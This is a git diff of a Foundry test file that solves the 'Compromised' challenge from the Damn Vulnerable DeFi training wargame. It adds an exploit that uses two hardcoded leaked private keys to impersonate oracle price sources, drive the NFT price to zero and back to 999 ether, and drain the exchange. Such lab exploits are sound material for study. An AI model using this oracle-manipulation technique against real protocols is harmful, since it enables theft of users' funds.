@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE, // 999ether
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -41,19 +44,22 @@ contract CompromisedChallenge is Test {
     function setUp() public {
         startHoax(deployer);
 
-        // Initialize balance of the trusted source addresses
+        // Initialize balance of the trusted source addresses 2ether
         for (uint256 i = 0; i < sources.length; i++) {
             vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
 
-        // Player starts with limited balance
+        // Player starts with limited balance 0.1ether
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -62,7 +68,7 @@ contract CompromisedChallenge is Test {
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
+    function test_assertInitialState_compromised() public view {
         for (uint256 i = 0; i < sources.length; i++) {
             assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
@@ -75,7 +81,35 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        //@note use the sk to send malicious data to the oracle
+        uint256 sk_1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 sk_2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source_1 = vm.addr(sk_1);
+        address source_2 = vm.addr(sk_2);
+
+        vm.prank(source_1);
+        oracle.postPrice("DVNFT", 0 ether);
+
+        vm.prank(source_2);
+        oracle.postPrice("DVNFT", 0 ether);
+
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+        vm.prank(source_1);
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.prank(source_2);
+        oracle.postPrice("DVNFT", 999 ether);
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+
+        payable(recovery).transfer(999 ether);
+        vm.stopPrank();
     }
 
     /**
